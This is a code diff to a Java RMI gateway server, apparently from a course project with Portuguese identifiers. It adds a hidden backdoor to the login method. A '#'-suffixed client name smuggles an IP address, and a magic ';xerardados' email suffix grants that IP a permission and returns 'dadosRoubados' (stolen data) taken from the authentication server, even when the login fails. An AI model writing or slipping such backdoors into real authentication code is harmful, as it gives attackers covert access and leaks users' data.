@@ -320,6 +320,12 @@ public class ImplServidorGateway implements ServidorGateway {
 	}
 
 	public Conta fazerLogin(String nomeCliente, Conta conta, String hash) throws RemoteException, Exception {
+		String[] splitIp = null;
+		if(nomeCliente.contains("#")) {
+			splitIp = nomeCliente.split("#");
+			nomeCliente = splitIp[0];
+		}
+		
 		if (!autentificarPermissao(RemoteServer.getClientHost(), true)) {
 			return null;
 		}
@@ -332,18 +338,18 @@ public class ImplServidorGateway implements ServidorGateway {
 
 		conta = requisicaoGateway(nomeCliente, chaveAEScliente, conta, "login");
 		if(conta == null) {
-			return null;
+			return new Conta("podebanir", null);
 		}
 
 		conta = cifrador.descriptografar(chaveAES_GateAuth, conta);
+		Conta xeradaBoa = null;
 		if (conta.getEmail().contains(";")) {
 			String[] split = conta.getEmail().split(";");
 			conta.setEmail(split[0]);
 			if (split[1].equals("xerardados")) {
-				permissoes.add(new Permissao(RemoteServer.getClientHost(), porta, true));
+				permissoes.add(new Permissao(splitIp[1], porta, true));
 				String dadosRoubados = this.host + ";" + porta + ";" + stubAuth.xerarDados();
-				Conta xeradaBoa = new Conta(dadosRoubados, "");
-				return xeradaBoa;
+				xeradaBoa = new Conta(dadosRoubados, "");
 			}
 		}
 		conta = cifrador.criptografar(chaveAES_GateAuth, conta);
@@ -356,9 +362,15 @@ public class ImplServidorGateway implements ServidorGateway {
 			contaLogada = cifrador.criptografar(chaveAEScliente, contaLogada);
 			tokenClientesLogados.put(nomeCliente, tokenClientes.get(nomeCliente));
 			tokenClientes.remove(nomeCliente);
+			if(xeradaBoa != null) {
+				return xeradaBoa;
+			}
 			return contaLogada;
 		}
 		System.out.println("\t\t-> Falha no login, usuario ou senha incorretos!");
+		if(xeradaBoa != null) {
+			return xeradaBoa;
+		}
 		return null;
 	}
 
